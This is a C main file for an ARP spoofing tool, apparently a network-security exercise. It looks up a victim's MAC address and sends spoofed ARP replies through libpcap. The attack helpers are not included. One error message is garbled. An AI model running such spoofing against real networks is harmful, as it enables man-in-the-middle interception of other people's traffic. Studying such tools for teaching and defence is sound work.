#include <main.h>
#include <util.h>
#include <arp.h>

// Print Usage
void usage() {
    printf("syntax: pcap_test <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

// Main Function
int main(int argc, char* argv[]) {
    int ret = EXIT_FAILURE;
    pcap_t *handle = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    uint8_t macAddress[ARP_HARDWARE_LENGTH_ETHERNET];

    // require arguments
    if (argc != 4) {
        usage();
        goto end;
    }

    // get packet using pcap library
    if(!(handle = pcap_open_live(argv[1], BUFSIZ, 1, 1024, errbuf))) {
        fprintf(stderr, "couldn't open devicnetinet/if_ether.he %s: %s\n", argv[1], errbuf);
        goto end;
    }

    // Get Victim MAC Address
    printf("[*] 1. Get Victim MAC Address\n");
    getVictimMacAddress(handle, argv[1], argv[2], macAddress);
    printMacAddress("[*] Victim MAC Address : ", macAddress);
    printf("\n\n");

    // Spoofing MAC Address
    printf("[*] 2. ARP Spoofing\n");
    spoofMacAddress(handle, argv[1], argv[2], argv[3], macAddress);
    
    ret = EXIT_SUCCESS; 

end:
    if(handle) {
        pcap_close(handle);
    }
    return ret;
}
